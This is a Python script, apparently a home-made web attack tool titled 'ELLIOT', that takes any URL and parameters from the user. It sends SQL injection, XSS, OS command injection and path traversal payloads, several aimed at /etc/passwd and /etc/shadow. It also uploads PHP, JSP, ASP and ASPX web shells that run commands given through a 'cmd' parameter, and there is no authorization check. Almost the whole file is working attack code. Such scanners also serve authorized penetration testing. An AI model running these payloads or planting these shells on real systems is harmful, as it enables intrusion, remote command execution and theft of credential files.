import requests

# Define payloads for different types of vulnerabilities
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR 1=1 -- ",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 1=1; --",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
]

xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
]

os_command_payloads = [
    '&& ls',
    '&& cat /etc/passwd',
    '| ls',
    '| cat /etc/passwd',
    '; ls',
    '; cat /etc/passwd',
    '`ls`',
    '`cat /etc/passwd`',
    '$(ls)',
    '$(cat /etc/passwd)',
]

path_traversal_payloads = [
    '../../../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/shadow',
    '../../../../../etc/shadow',
    '../../../../../../windows/system32/drivers/etc/hosts',
    '../../../../../windows/system32/drivers/etc/hosts',
    '../../../../../../windows/win.ini',
    '../../../../../windows/win.ini',
]

file_upload_payloads = {
    'php_shell.php': '<?php echo shell_exec($_GET["cmd"]); ?>',
    'jsp_shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    'asp_shell.asp': '<% eval request("cmd") %>',
    'aspx_shell.aspx': '<% @ Page Language="C#" %><% System.Diagnostics.Process.Start(Request.QueryString["cmd"]); %>',
}

# Function to test SQL Injection
def test_sql_injection(url, params, payloads):
    for payload in payloads:
        for key in params.keys():
            test_params = params.copy()
            test_params[key] = payload
            try:
                response = requests.get(url, params=test_params)
                response.raise_for_status()  # Check for HTTP errors
                if "SQL" in response.text or "syntax error" in response.text:
                    print(f"Potential SQL Injection found with payload: {payload}")
                    print(f"Response: {response.text[:200]}")
            except requests.RequestException as e:
                print(f"Error during SQL Injection test with payload {payload}: {e}")

# Function to test XSS
def test_xss(url, params, payloads):
    for payload in payloads:
        for key in params.keys():
            test_params = params.copy()
            test_params[key] = payload
            try:
                response = requests.get(url, params=test_params)
                response.raise_for_status()  # Check for HTTP errors
                if payload in response.text:
                    print(f"Potential XSS found with payload: {payload}")
                    print(f"Response snippet: {response.text[:200]}")
            except requests.RequestException as e:
                print(f"Error during XSS test with payload {payload}: {e}")

# Function to test OS Command Injection
def test_os_command_injection(url, params, payloads):
    for payload in payloads:
        for key in params.keys():
            test_params = params.copy()
            test_params[key] = payload
            try:
                response = requests.get(url, params=test_params)
                response.raise_for_status()  # Check for HTTP errors
                if 'root:x' in response.text or any(cmd in response.text for cmd in ['bin', 'usr', 'etc']):
                    print(f"Potential OS Command Injection found with payload: {payload}")
                    print(f"Response snippet: {response.text[:200]}")
            except requests.RequestException as e:
                print(f"Error during OS Command Injection test with payload {payload}: {e}")

# Function to test Path Traversal
def test_path_traversal(url, params, payloads):
    for payload in payloads:
        for key in params.keys():
            test_params = params.copy()
            test_params[key] = payload
            try:
                response = requests.get(url, params=test_params)
                response.raise_for_status()  # Check for HTTP errors
                if 'root:' in response.text or '127.0.0.1' in response.text or 'windows' in response.text:
                    print(f"Potential Path Traversal found with payload: {payload}")
                    print(f"Response snippet: {response.text[:200]}")
            except requests.RequestException as e:
                print(f"Error during Path Traversal test with payload {payload}: {e}")

# Function to test File Upload Vulnerability
def test_file_upload(url, files):
    for filename, content in files.items():
        file = {'file': (filename, content)}
        try:
            response = requests.post(url, files=file)
            response.raise_for_status()  # Check for HTTP errors
            if response.status_code == 200:
                print(f"Uploaded {filename} successfully")
                print(f"Response: {response.text[:200]}")
            else:
                print(f"Failed to upload {filename}")
                print(f"Response Code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error during file upload test with {filename}: {e}")

# Main function to prompt user for input and run tests
def main():
    print("__________________ELLIOT_______________")
    url = input("Enter the URL of the page to test: ").strip()
    
    params = {}
    while True:
        param = input("Enter parameter name (or press Enter to stop adding parameters): ").strip()
        if not param:
            break
        value = input(f"Enter value for parameter '{param}': ").strip()
        params[param] = value

    print("\nSelect tests to perform:")
    print("1. SQL Injection")
    print("2. XSS")
    print("3. OS Command Injection")
    print("4. Path Traversal")
    print("5. File Upload Vulnerability")
    selected_tests = input("Enter the numbers of the tests to perform, separated by commas (e.g., 1,3,5): ").split(',')

    if '1' in selected_tests:
        print("\nTesting SQL Injection...")
        test_sql_injection(url, params, sql_payloads)

    if '2' in selected_tests:
        print("\nTesting XSS...")
        test_xss(url, params, xss_payloads)

    if '3' in selected_tests:
        print("\nTesting OS Command Injection...")
        test_os_command_injection(url, params, os_command_payloads)

    if '4' in selected_tests:
        print("\nTesting Path Traversal...")
        test_path_traversal(url, params, path_traversal_payloads)

    if '5' in selected_tests:
        print("\nTesting File Upload Vulnerability...")
        test_file_upload(url, file_upload_payloads)

if __name__ == "__main__":
    main()
